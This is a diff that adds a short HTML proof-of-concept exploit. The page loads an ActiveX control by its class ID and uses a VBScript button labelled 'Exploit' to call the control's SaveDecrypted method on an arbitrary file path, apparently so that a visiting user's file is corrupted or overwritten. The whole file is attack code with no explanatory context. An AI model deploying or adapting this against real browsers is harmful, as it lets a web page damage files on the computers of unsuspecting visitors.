@@ -1,0 +1,11 @@
+&lt;html&gt;
+&lt;object classid=&#039;clsid:0B70AB61-5C95-4126-9985-A32531CA8619&#039; id=&#039;target&#039; /&gt;&lt;/object&gt;
+&lt;input language=VBScript onclick=Boom() type=button value=&quot;Exploit&quot;&gt;
+&lt;script language = &#039;vbscript&#039;&gt;
+Sub Boom()
+arg1=&quot;FilePath\Filename_to_corrupt&quot;
+target.SaveDecrypted arg1
+End Sub
+&lt;/script&gt;
+
+&lt;/html&gt;
